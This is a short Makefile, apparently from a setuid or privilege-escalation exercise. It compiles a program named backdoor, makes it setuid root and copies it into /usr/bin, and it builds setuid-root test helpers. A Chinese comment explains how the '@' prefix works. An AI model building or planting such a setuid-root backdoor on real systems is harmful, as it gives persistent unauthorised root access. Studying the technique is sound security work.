all:
	@gcc backdoor.c -o backdoor
	@sudo chown root:root backdoor
	@sudo chmod u+s backdoor
install:
	@sudo cp backdoor /usr/bin/backdoor
remove:
	@sudo rm /usr/bin/backdoor
test:
	@gcc printUID.c -o printUID
	@gcc changeUID.c -o changeUID
	@sudo chown root:root changeUID
	@sudo chmod u+s changeUID
#@的作用是不显示makefile执行的命令
